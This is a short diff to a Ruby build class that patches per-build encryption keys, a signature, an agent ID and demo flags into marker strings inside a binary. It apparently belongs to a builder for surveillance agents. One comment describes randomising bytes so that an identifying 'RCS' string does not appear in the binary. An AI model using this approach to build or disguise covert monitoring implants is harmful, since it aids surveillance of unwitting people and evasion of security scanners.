@@ -93,7 +93,7 @@ class Build
     # evidence encryption key
     begin
       key = Digest::MD5.digest(@factory.logkey) + SecureRandom.random_bytes(16)
-      content['3j9WmmDgBqyU270FTid3719g64bP4s52'] = key
+      content.gsub! '3j9WmmDgBqyU270FTid3719g64bP4s52', key
     rescue
       raise "Evidence key marker not found"
     end
@@ -101,7 +101,7 @@ class Build
     # conf encryption key
     begin
       key = Digest::MD5.digest(@factory.confkey) + SecureRandom.random_bytes(16)
-      content['Adf5V57gQtyi90wUhpb8Neg56756j87R'] = key
+      content.gsub! 'Adf5V57gQtyi90wUhpb8Neg56756j87R', key
     rescue
       raise "Config key marker not found"
     end
@@ -110,7 +110,7 @@ class Build
     begin
       sign = ::Signature.where({scope: 'agent'}).first
       signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
-      content['f7Hk0f5usd04apdvqw13F5ed25soV5eD'] = signature
+      content.gsub! 'f7Hk0f5usd04apdvqw13F5ed25soV5eD', signature
     rescue
       raise "Signature marker not found"
     end
@@ -120,14 +120,14 @@ class Build
       id = @factory.ident.dup
       # first three bytes are random to avoid the RCS string in the binary file
       id['RCS_'] = SecureRandom.hex(2)
-      content['av3pVck1gb4eR2'] = id
+      content.gsub! 'av3pVck1gb4eR2', id
     rescue
       raise "Agent ID marker not found"
     end
 
     # demo parameters
     begin
-      content['hxVtdxJ/Z8LvK3ULSnKRUmLE'] = SecureRandom.random_bytes(24) unless params['demo']
+      content.gsub!('hxVtdxJ/Z8LvK3ULSnKRUmLE', SecureRandom.random_bytes(24)) unless params['demo']
     rescue
       raise "Demo marker not found"
     end
